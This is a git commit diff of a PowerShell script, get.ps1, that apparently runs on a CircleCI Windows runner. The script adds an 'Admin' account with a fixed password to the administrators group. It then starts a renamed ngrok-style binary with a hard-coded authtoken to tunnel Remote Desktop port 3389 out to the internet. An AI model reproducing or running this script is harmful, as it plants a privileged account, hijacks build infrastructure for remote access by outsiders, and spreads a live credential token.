a04ecc3d6efa8bd1c943e48f9a8f6590be7e5d0a
Usser1222 <163659668+Usser1222@users.noreply.github.com>
2024-03-16 19:16:00 +0300

    Update get.ps1

--- get.ps1
+++ get.ps1
@@ -2,7 +2,7 @@ cmd /c net user /add Admin P@ssw0rd.
 cmd /c net localgroup /add administrators Admin
 
 use.exe authtoken 2cn87V9NMzmnYMwO3Vgp6rtvFde_3PkxAeYd8zjbLwMge7LAe
-use.exe tcp 3389 --log=stdout > C:\Users\circleci\Downloads\ngrok.log &
+use.exe tcp 3389 --log=stdout > C:\Users\circleci\Downloads\ngrok.log
 
 $i = 10000000
 do {
